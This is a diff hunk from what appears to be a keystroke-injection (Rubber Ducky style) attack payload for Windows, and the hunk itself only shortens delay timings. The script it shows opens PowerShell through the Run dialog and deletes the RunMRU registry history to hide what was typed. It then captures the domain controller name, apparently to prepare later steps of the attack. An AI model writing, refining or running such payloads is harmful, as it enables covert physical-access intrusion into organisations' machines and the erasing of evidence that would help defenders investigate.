@@ -7,10 +7,10 @@ GUI r
 DELAY 1000
 STRING powershell
 ENTER
-DELAY 3000
+DELAY 2000
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
-DELAY 3000
+DELAY 2000
 REM | in CMD prompt, use "%logonserver:~2%" to get plain DC server name. In powershell, use "$env:LOGONSERVER.substring(2)", but must be variable substituted
 STRING $D=$env:LOGONSERVER.substring(2)
 ENTER
